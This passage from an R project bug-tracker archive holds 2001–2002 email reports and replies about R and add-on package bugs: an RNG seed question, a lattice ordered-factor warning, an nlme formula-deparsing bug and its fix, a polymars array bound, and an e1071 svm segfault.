..whereas 1.5.0 which now again shows trouble has

>  .Random.seed
[1]         1 196857153 319227924

and 1.4.0 in a clean dir has this after a few iterations of the above

>  .Random.seed
[1]          1 1297109091   47580530


Oho! I think I get it: the "1" in the seed actually *defines* the RNG,
no matter what RNGkind() is telling me??

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1664.audit <==
Fri Jun 14 17:43:33 2002	pd	changed notes
Fri Jun 14 17:43:33 2002	pd	foobar
Fri Jun 14 17:43:33 2002	pd	moved from incoming to Accuracy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Add-ons

* PR# 974 *
Subject: Lattice: panel.superpose with ordered factor groups
From: John Maindonald <john.maindonald@anu.edu.au>
Date: Sat, 9 Jun 2001 11:08:51 +1000 (EST)
--The warning is standard S and R behaviour.
--Probably xyplot needs to avoid it (by unclassing?)
--Still there in lattice 0.3-0.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 974 <==
From postmaster@franz.stat.wisc.edu  Sat Jun  9 03:09:10 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA20814
	for <r-bugs@biostat.ku.dk>; Sat, 9 Jun 2001 03:09:09 +0200 (MET DST)
Received: from leonard.anu.edu.au (really [150.203.2.15]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m158XFN-000JbdC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Fri, 8 Jun 2001 20:09:01 -0500 (CDT) 
Received: (from u9801539@localhost)
	by leonard.anu.edu.au (8.9.3/8.9.3) id LAA01081;
	Sat, 9 Jun 2001 11:08:51 +1000 (EST)
Date: Sat, 9 Jun 2001 11:08:51 +1000 (EST)
From: John Maindonald <john.maindonald@anu.edu.au>
Message-Id: <200106090108.LAA01081@leonard.anu.edu.au>
To: r-bugs@r-project.org
Subject: Lattice: panel.superpose with ordered factor groups
Cc: deepayan@stat.wisc.edu


#       r-bugs@r-project.org
The panel.superpose() function for xyplot() complains when 
the groups parameter is set to be an ordered factor.

> library(mass)
> data(cabbages)
> library(lattice)
> xyplot(HeadWt~VitC|Cult, panel=panel.superpose,
+   groups=Date, data=cabbages)
> cabbages$Date <- ordered(cabbages$Date)  # Make Date an ordered factor
> xyplot(HeadWt~VitC|Cult, panel=panel.superpose,
+   groups=Date, data=cabbages)
Warning messages: 
1: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
2: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
3: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
4: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
5: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
6: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = x86
 os = Win32
 system = x86, Win32
 status = 
 major = 1
 minor = 2.3
 year = 2001
 month = 04
 day = 26
 language = R

Windows ME 4.90 (build 3000)  

Search Path:
 .GlobalEnv, package:grid, package:lattice, package:mass, package:ctest, Autoloads, package:base
John Maindonald            email: john.maindonald@anu.edu.au        
phone : (6125)3998         fax   : (6125)5549 
Statistical Consulting Unit, Room 1194,
John Dedman Mathematical Sciences Building
(Centre for Mathematics & Its Applications.)

==> 974.audit <==
Sun Jun 17 09:39:36 2001	ripley	changed notes
Sun Jun 17 09:39:36 2001	ripley	foobar
Sun Jun 17 09:39:36 2001	ripley	moved from incoming to Add-ons
Sun Sep 30 15:13:56 2001	ripley	changed notes
Sun Sep 30 15:13:56 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1038 *
Subject: nlme: bug in getCovariateFormula
From: Setzer.Woodrow@epamail.epa.gov
Date: Tue, 31 Jul 2001 11:24:09 -0400
--change needed in package nlme
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1038 <==
From Setzer.Woodrow@epamail.epa.gov  Tue Jul 31 17:47:13 2001
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA10358
	for <R-bugs@biostat.ku.dk>; Tue, 31 Jul 2001 17:47:12 +0200 (MET DST)
From: Setzer.Woodrow@epamail.epa.gov
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id RAA29279
	for <r-bugs@lists.r-project.org>; Tue, 31 Jul 2001 17:47:07 +0200 (MET DST)
Received: from marconi.rtp.epa.gov(134.67.208.99)
 via SMTP by hypatia, id smtpdAAAa0079S; Tue Jul 31 17:47:02 2001
Received: from epahub11.rtp.epa.gov (epahub11.rtp.epa.gov [134.67.213.52])
 by epamail.epa.gov (PMDF V5.2-33 #42056)
 with ESMTP id <0GHC004FLGOB26@epamail.epa.gov> for r-bugs@lists.r-project.org;
 Tue, 31 Jul 2001 11:40:58 -0400 (EDT)
Date: Tue, 31 Jul 2001 11:24:09 -0400
Subject: nlme: bug in getCovariateFormula
To: r-bugs@hypatia.math.ethz.ch
Message-id: <OF64B799E7.BEBD283E-ON85256A9A.0052DE38@rtp.epa.gov>
MIME-version: 1.0
X-Mailer: Lotus Notes Release 5.0.3  March 21, 2000
Content-type: text/plain; charset=us-ascii
X-MIMETrack: Serialize by Router on EPAHUB11/USEPA/US(Release 5.0.6a |January
 17, 2001) at 07/31/2001 11:40:58 AM

I found that predict.gnls failed with a wierd error message about a
non-numeric argument to a binary vector in one of three nearly identical
uses.

Error in Inh/Ki : non-numeric argument to binary operator

(Inh and Ki are arguments to the function used in the formula for the
object whose predictions were requested).

It turns out that the problem is in getCovariateFormula().

The final line in getCovariateFormula() in the nlme package (version
3.1-16) is:
    eval(parse(text = paste("~", deparse(form))))

however, if deparse(form) exceeds 'width.cutoff (which defaults to 60)',
this results in inappropriately placed "~" signs:
For example, in my application with the error, form is

UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)

the result of the paste() operation in the last line of getCovariateFormula
is:

> paste("~",deparse(form))
[1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, "
[2] "~     Ki)"

extending width.cutoff gives the intended value:

> paste("~",deparse(form,width.cutoff=500))
[1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)"

Seems a bit risky for an enforced cutoff in deparse, though.

R. Woodrow Setzer, Jr.                                            Phone:
(919) 541-0128
Experimental Toxicology Division                       Fax:  (919) 541-5394
Pharmacokinetics Branch
NHEERL MD-74; US EPA; RTP, NC 27711


==> 1038.reply.1 <==
From pd@blueberry.kubism.ku.dk  Tue Jul 31 18:12:16 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA10513;
	Tue, 31 Jul 2001 18:12:16 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id SAA26023;
	Tue, 31 Jul 2001 18:21:47 +0200
Sender: pd@pubhealth.ku.dk
To: Setzer.Woodrow@epamail.epa.gov
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] nlme: bug in getCovariateFormula (PR#1038)
References: <200107311547.RAA10368@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 31 Jul 2001 18:21:46 +0200
In-Reply-To: Setzer.Woodrow@epamail.epa.gov's message of "Tue, 31 Jul 2001 17:47:14 +0200 (MET DST)"
Message-ID: <x2d76h6pd1.fsf@blueberry.kubism.ku.dk>
Lines: 50
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

Setzer.Woodrow@epamail.epa.gov writes:

> The final line in getCovariateFormula() in the nlme package (version
> 3.1-16) is:
>     eval(parse(text = paste("~", deparse(form))))
> 
> however, if deparse(form) exceeds 'width.cutoff (which defaults to 60)',
> this results in inappropriately placed "~" signs:
> For example, in my application with the error, form is
> 
> UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)
> 
> the result of the paste() operation in the last line of getCovariateFormula
> is:
> 
> > paste("~",deparse(form))
> [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, "
> [2] "~     Ki)"
> 
> extending width.cutoff gives the intended value:
> 
> > paste("~",deparse(form,width.cutoff=500))
> [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)"
> 
> Seems a bit risky for an enforced cutoff in deparse, though.

parse(...deparse(...)) always looks wrong to me anyway. Couldn't one
use something like

f <- ~1
f[[2]] <- form
eval(f)

or 

eval(as.call(list(as.name("~"),form)))

or

eval(substitute(~form)) # that's not going to work in S, though...

??

(What is the eval for? Doesn't usually do anything to a
formula argument.)
-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1038.reply.2 <==
From bates@stat.wisc.edu  Tue Jul 31 21:17:07 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA11163;
	Tue, 31 Jul 2001 21:17:06 +0200 (MET DST)
Received: by franz.stat.wisc.edu
	via sendmail from stdin
	id <m15RegF-000JP1C@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for R-bugs@biostat.ku.dk; Tue, 31 Jul 2001 13:55:47 -0500 (CDT) 
Sender: bates@franz.stat.wisc.edu
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Cc: Setzer.Woodrow@epamail.epa.gov, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Re: [Rd] nlme: bug in getCovariateFormula (PR#1038)
References: <200107311547.RAA10368@pubhealth.ku.dk>
	<x2d76h6pd1.fsf@blueberry.kubism.ku.dk>
From: Douglas Bates <bates@stat.wisc.edu>
Date: 31 Jul 2001 13:55:47 -0500
In-Reply-To: <x2d76h6pd1.fsf@blueberry.kubism.ku.dk>
Message-ID: <6relqxorm4.fsf@franz.stat.wisc.edu>
Lines: 55
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> writes:

> Setzer.Woodrow@epamail.epa.gov writes:
> 
> > The final line in getCovariateFormula() in the nlme package (version
> > 3.1-16) is:
> >     eval(parse(text = paste("~", deparse(form))))
> > 
> > however, if deparse(form) exceeds 'width.cutoff (which defaults to 60)',
> > this results in inappropriately placed "~" signs:
> > For example, in my application with the error, form is
> > 
> > UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)
> > 
> > the result of the paste() operation in the last line of getCovariateFormula
> > is:
> > 
> > > paste("~",deparse(form))
> > [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, "
> > [2] "~     Ki)"
> > 
> > extending width.cutoff gives the intended value:
> > 
> > > paste("~",deparse(form,width.cutoff=500))
> > [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)"
> > 
> > Seems a bit risky for an enforced cutoff in deparse, though.
> 
> parse(...deparse(...)) always looks wrong to me anyway. Couldn't one
> use something like
> 
> f <- ~1
> f[[2]] <- form
> eval(f)
> 
> or 
> 
> eval(as.call(list(as.name("~"),form)))

> or
> 
> eval(substitute(~form)) # that's not going to work in S, though...

Exactly.  The code was originally written for S and ported to R.  Some
of the contorted expressions were things that we found by
experimentation would work in both systems.

> ??
> 
> (What is the eval for? Doesn't usually do anything to a
> formula argument.)

In Sv3 at least it assigns a class to the object.

I'll change it to eval(substitute(~form)) for the R package.

==> 1038.followup.1 <==
From Setzer.Woodrow@epamail.epa.gov  Tue Jul 31 22:19:22 2001
Received: from marconi.rtp.epa.gov (marconi.rtp.epa.gov [134.67.208.99])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA11392;
	Tue, 31 Jul 2001 22:19:19 +0200 (MET DST)
From: Setzer.Woodrow@epamail.epa.gov
Received: from epahub11.rtp.epa.gov (epahub11.rtp.epa.gov [134.67.213.52])
 by epamail.epa.gov (PMDF V5.2-33 #42056)
 with ESMTP id <0GHC00AQNTEESU@epamail.epa.gov>; Tue,
 31 Jul 2001 16:11:02 -0400 (EDT)
Date: Tue, 31 Jul 2001 16:10:54 -0400
Subject: Re: [Rd] nlme: bug in getCovariateFormula (PR#1038)
To: Douglas Bates <bates@stat.wisc.edu>
Cc: bates@franz.stat.wisc.edu, Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>,
        R-bugs@biostat.ku.dk, r-devel@stat.math.ethz.ch
Message-id: <OF7528A682.B9E78D2C-ON85256A9A.006E9C38@rtp.epa.gov>
MIME-version: 1.0
X-Mailer: Lotus Notes Release 5.0.3  March 21, 2000
Content-type: text/plain; charset=us-ascii
X-MIMETrack: Serialize by Router on EPAHUB11/USEPA/US(Release 5.0.6a |January
 17, 2001) at 07/31/2001 04:11:02 PM


It looks clunky, but you could maintain consistency across S and R forms
with

eval(parse(text=paste("~",paste(deparse(form),collapse=" "))))


R. Woodrow Setzer, Jr.                                            Phone:
(919) 541-0128
Experimental Toxicology Division                       Fax:  (919) 541-5394
Pharmacokinetics Branch
NHEERL MD-74; US EPA; RTP, NC 27711


                                                                                                                
                    Douglas Bates                                                                               
                    <bates@stat.wis        To:     Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>                
                    c.edu>                 cc:     Woodrow Setzer/RTP/USEPA/US@EPA, r-devel@stat.math.ethz.ch,  
                    Sent by:               R-bugs@biostat.ku.dk                                                 
                    bates@franz.sta        Subject:     Re: [Rd] nlme: bug in getCovariateFormula (PR#1038)     
                    t.wisc.edu                                                                                  
                                                                                                                
                                                                                                                
                    07/31/01 02:55                                                                              
                    PM                                                                                          
                                                                                                                
                                                                                                                




Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> writes:

> Setzer.Woodrow@epamail.epa.gov writes:
>
> > The final line in getCovariateFormula() in the nlme package (version
> > 3.1-16) is:
> >     eval(parse(text = paste("~", deparse(form))))
> >
> > however, if deparse(form) exceeds 'width.cutoff (which defaults to
60)',
> > this results in inappropriately placed "~" signs:
> > For example, in my application with the error, form is
> >
> > UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, Ki)
> >
> > the result of the paste() operation in the last line of
getCovariateFormula
> > is:
> >
> > > paste("~",deparse(form))
> > [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km, "
> > [2] "~     Ki)"
> >
> > extending width.cutoff gives the intended value:
> >
> > > paste("~",deparse(form,width.cutoff=500))
> > [1] "~ UnCompetitive(MethoxyresorufinConc, InhibitorConc, Vmax, Km,
Ki)"
> >
> > Seems a bit risky for an enforced cutoff in deparse, though.
>
> parse(...deparse(...)) always looks wrong to me anyway. Couldn't one
> use something like
>
> f <- ~1
> f[[2]] <- form
> eval(f)
>
> or
>
> eval(as.call(list(as.name("~"),form)))

> or
>
> eval(substitute(~form)) # that's not going to work in S, though...

Exactly.  The code was originally written for S and ported to R.  Some
of the contorted expressions were things that we found by
experimentation would work in both systems.

> ??
>
> (What is the eval for? Doesn't usually do anything to a
> formula argument.)

In Sv3 at least it assigns a class to the object.

I'll change it to eval(substitute(~form)) for the R package.





==> 1038.reply.3 <==
From pd@blueberry.kubism.ku.dk  Tue Jul 31 23:16:31 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA11578;
	Tue, 31 Jul 2001 23:16:30 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id XAA26225;
	Tue, 31 Jul 2001 23:26:04 +0200
Sender: pd@pubhealth.ku.dk
To: Douglas Bates <bates@stat.wisc.edu>
Cc: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>,
        Setzer.Woodrow@epamail.epa.gov, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Re: [Rd] nlme: bug in getCovariateFormula (PR#1038)
References: <200107311547.RAA10368@pubhealth.ku.dk> <x2d76h6pd1.fsf@blueberry.kubism.ku.dk> <6relqxorm4.fsf@franz.stat.wisc.edu>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 31 Jul 2001 23:26:04 +0200
In-Reply-To: Douglas Bates's message of "31 Jul 2001 13:55:47 -0500"
Message-ID: <x2ae1k23kj.fsf@blueberry.kubism.ku.dk>
Lines: 25
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

Douglas Bates <bates@stat.wisc.edu> writes:

> Exactly.  The code was originally written for S and ported to R.  Some
> of the contorted expressions were things that we found by
> experimentation would work in both systems.
> 
> > ??
> > 
> > (What is the eval for? Doesn't usually do anything to a
> > formula argument.)
> 
> In Sv3 at least it assigns a class to the object.

Aha. In R too.

> I'll change it to eval(substitute(~form)) for the R package.

Great. I would have thought that one of the two other forms would be
portable, though. 

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1038.audit <==
Fri Aug  3 12:00:14 2001	ripley	changed notes
Fri Aug  3 12:00:14 2001	ripley	foobar
Fri Aug  3 12:00:14 2001	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1044 *
Subject: Polymarsall.c
From: pleu@hotmail.com
Date: Tue, 7 Aug 2001 22:42:07 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1044 <==
From pleu@hotmail.com  Tue Aug  7 22:42:07 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA01752
	for <R-bugs@biostat.ku.dk>; Tue, 7 Aug 2001 22:42:07 +0200 (MET DST)
Date: Tue, 7 Aug 2001 22:42:07 +0200 (MET DST)
From: pleu@hotmail.com
Message-Id: <200108072042.WAA01752@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Polymarsall.c

Full_Name: Paul Leu
Version: 1.2.3
OS: Windows NT
Submission from: (NULL) (12.2.142.7)


There is a bug in the polymars code.  

Line 655   m=m+k-1;

ought to be moved in front of the for loop in line 652 or else the levels array
will go out of bounds in the loop.

This does not seem to cause any errors in R, but caused crashes when I attempted
to link the file to PV-wave.  

Paul

==> 1044.audit <==
Sat Aug 11 09:56:56 2001	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1178 *
Subject: segfault using svm from e1071
From: Jan Rychter <jan@rychter.com>
Date: Tue, 20 Nov 2001 23:38:17 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1178 <==
From postmaster@franz.stat.wisc.edu  Tue Nov 20 23:37:59 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA07060
	for <r-bugs@biostat.ku.dk>; Tue, 20 Nov 2001 23:37:58 +0100 (MET)
Received: from screech.rychter.com (really [212.87.11.114]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m166JWa-000IXPC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 20 Nov 2001 16:37:52 -0600 (CST) 
Received: from tnuctip.rychter.com (tnuctip-tun0.rychter.com [10.0.0.2])
	by screech.rychter.com (Postfix) with ESMTP id 0FBB94A600
	for <r-bugs@r-project.org>; Tue, 20 Nov 2001 23:09:04 +0100 (CET)
Received: by tnuctip.rychter.com (Postfix, from userid 501)
	id 75F7369F24; Tue, 20 Nov 2001 23:38:19 +0100 (CET)
Sender: jan@rychter.com
From: Jan Rychter <jan@rychter.com>
To: r-bugs@r-project.org
Subject: segfault using svm from e1071
X-Operating-System: Linux 2.4.12 #6 Mon Nov 12 12:22:25 CET 2001
X-No-Archive: yes
Date: Tue, 20 Nov 2001 23:38:17 +0100
Message-ID: <m27ksl83vq.fsf@tnuctip.rychter.com>
Lines: 29
User-Agent: Gnus/5.090004 (Oort Gnus v0.04) XEmacs/21.4 (Artificial
 Intelligence, i386-mandrake-linux)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

This could be a bug in the e1071 svm code, but maybe not -- I guess I'll
send it here anyway. It's reproducible.

> x <- seq (0.1,5,by=0.05)
> y <- log(x) + rnorm (x, sd=0.2)
> library(e1071)
> m <- svm (x,y)

Process R segmentation fault at Tue Nov 20 23:34:19 2001

> version
         _                
platform i686-pc-linux-gnu
arch     i686             
os       linux-gnu        
system   i686, linux-gnu  
status                    
major    1                
minor    3.1              
year     2001             
month    08               
day      31               
language R                

I used the Mandrake 8.0 RPM binaries from cran.r-project.org first, then
recompiled R myself and reinstalled e1071. Same results.

thanks,
--J.

==> 1178.reply.1 <==
From maechler@stat.math.ethz.ch  Wed Nov 21 10:25:03 2001
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA09827
	for <R-bugs@biostat.ku.dk>; Wed, 21 Nov 2001 10:25:02 +0100 (MET)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA19332;
	Wed, 21 Nov 2001 10:24:31 +0100 (MET)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa004i1; Wed Nov 21 10:24:28 2001
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id fAL9OVR32205;
	Wed, 21 Nov 2001 10:24:31 +0100
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15355.29391.627802.421311@gargle.gargle.HOWL>
Date: Wed, 21 Nov 2001 10:24:31 +0100
To: jan@rychter.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] segfault using svm from e1071 (PR#1178)
In-Reply-To: <200111202238.XAA07070@pubhealth.ku.dk>
References: <200111202238.XAA07070@pubhealth.ku.dk>
X-Mailer: VM 6.97 under Emacs 21.1.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "jan" == jan  <jan@rychter.com> writes:

    jan> This could be a bug in the e1071 svm code, but maybe
    jan> not -- I guess I'll send it here anyway. It's
    jan> reproducible.

not really reproducible:

1) If you use random data (which is perfect),
  you need an explicit  set.seed(.) statement to make it reproducible

2) I can evaluate the code below (intel-Linux as you)
    more than 100 times without a problem.

Martin

    >> x <- seq (0.1,5,by=0.05)
    >> y <- log(x) + rnorm (x, sd=0.2)
    >> library(e1071)
    >> m <- svm (x,y)

    jan> Process R segmentation fault at Tue Nov 20 23:34:19 2001

    >> version
    jan> _                
    jan> platform i686-pc-linux-gnu
    jan> arch     i686             
    jan> os       linux-gnu        
    jan> system   i686, linux-gnu  
    jan> status                    
    jan> major    1                
    jan> minor    3.1              
    jan> year     2001             
    jan> month    08               
    jan> day      31               
    jan> language R                

    jan> I used the Mandrake 8.0 RPM binaries from
    jan> cran.r-project.org first, then recompiled R myself and
    jan> reinstalled e1071. Same results.



==> 1178.followup.1 <==
From david.meyer@ci.tuwien.ac.at  Wed Nov 21 11:36:27 2001
Received: from fangorn.ci.tuwien.ac.at (root@fangorn.ci.tuwien.ac.at [128.131.51.24])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA10869
	for <R-bugs@biostat.ku.dk>; Wed, 21 Nov 2001 11:36:26 +0100 (MET)
Received: from ci.tuwien.ac.at (meyer@boromir.ci.tuwien.ac.at [128.131.51.39])
	by fangorn.ci.tuwien.ac.at (8.9.3/8.8.5) with ESMTP id LAA25634;
	Wed, 21 Nov 2001 11:36:14 +0100
X-Authentication-Warning: fangorn.ci.tuwien.ac.at: Host meyer@boromir.ci.tuwien.ac.at [128.131.51.39] claimed to be ci.tuwien.ac.at
Sender: meyer@ci.tuwien.ac.at
Message-ID: <3BFB838A.E7E40F39@ci.tuwien.ac.at>
Date: Wed, 21 Nov 2001 11:35:55 +0100
From: David Meyer <david.meyer@ci.tuwien.ac.at>
Organization: Vienna University of Technology
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.13-k6 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: jan@rychter.com
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] segfault using svm from e1071 (PR#1178)
References: <200111202238.XAA07070@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

jan@rychter.com wrote:
> 
> This could be a bug in the e1071 svm code, but maybe not -- I guess I'll
> send it here anyway. It's reproducible.

Which version of e1071 are you using (Current: 1.2-1)? This package had
a bug fix release one month ago.

-d


> 
> > x <- seq (0.1,5,by=0.05)
> > y <- log(x) + rnorm (x, sd=0.2)
> > library(e1071)
> > m <- svm (x,y)
> 
> Process R segmentation fault at Tue Nov 20 23:34:19 2001
> 
> > version
>          _
> platform i686-pc-linux-gnu
> arch     i686
> os       linux-gnu
> system   i686, linux-gnu
> status
> major    1
> minor    3.1
> year     2001
> month    08
> day      31
> language R
> 
> I used the Mandrake 8.0 RPM binaries from cran.r-project.org first, then
> recompiled R myself and reinstalled e1071. Same results.
> 
> thanks,
> --J.
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
	Mag. David Meyer		Wiedner Hauptstrasse 8-10
Vienna University of Technology		A-1040 Vienna/AUSTRIA
       Department for			Tel.: (+431) 58801/10772
Statistics and Probability Theory	mail: david.meyer@ci.tuwien.ac.at

==> 1178.followup.2 <==
From jan@rychter.com  Wed Nov 21 12:20:26 2001
Received: from screech.rychter.com (screech.rychter.com [212.87.11.114])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA11623
	for <R-bugs@biostat.ku.dk>; Wed, 21 Nov 2001 12:20:26 +0100 (MET)
Received: from tnuctip.rychter.com (tnuctip-tun0.rychter.com [10.0.0.2])
	by screech.rychter.com (Postfix) with ESMTP
	id D04894A600; Wed, 21 Nov 2001 11:51:28 +0100 (CET)
Received: by tnuctip.rychter.com (Postfix, from userid 501)
	id 310F469F24; Wed, 21 Nov 2001 12:20:46 +0100 (CET)
Sender: jan@rychter.com
From: Jan Rychter <jan@rychter.com>
To: David Meyer <david.meyer@ci.tuwien.ac.at>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] segfault using svm from e1071 (PR#1178)
References: <200111202238.XAA07070@pubhealth.ku.dk>
	<3BFB838A.E7E40F39@ci.tuwien.ac.at>
X-Operating-System: Linux 2.4.12 #6 Mon Nov 12 12:22:25 CET 2001
X-No-Archive: yes
Date: Wed, 21 Nov 2001 12:20:45 +0100
In-Reply-To: <3BFB838A.E7E40F39@ci.tuwien.ac.at> (David Meyer's message of
 "Wed, 21 Nov 2001 11:35:55 +0100")
Message-ID: <m21yis1ib6.fsf@tnuctip.rychter.com>
Lines: 30
User-Agent: Gnus/5.090004 (Oort Gnus v0.04) XEmacs/21.4 (Artificial
 Intelligence, i386-mandrake-linux)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

>>>>> "David" == David Meyer <david.meyer@ci.tuwien.ac.at> writes:
 David> jan@rychter.com wrote:
 >>
 >> This could be a bug in the e1071 svm code, but maybe not -- I guess
 >> I'll send it here anyway. It's reproducible.

 David> Which version of e1071 are you using (Current: 1.2-1)? This
 David> package had a bug fix release one month ago.

e1071_1.2-1.tar.gz

--J.

 > x <- seq (0.1,5,by=0.05) y <- log(x) + rnorm (x, sd=0.2)
 > library(e1071) m <- svm (x,y)
 >>
 >> Process R segmentation fault at Tue Nov 20 23:34:19 2001
 >>
 > version
 >> _ platform i686-pc-linux-gnu arch i686 os linux-gnu system i686,
 >> linux-gnu status major 1 minor 3.1 year 2001 month 08 day 31
 >> language R
 >>
 >> I used the Mandrake 8.0 RPM binaries from cran.r-project.org first,
 >> then recompiled R myself and reinstalled e1071. Same results.
 >>

[...]



==> 1178.audit <==
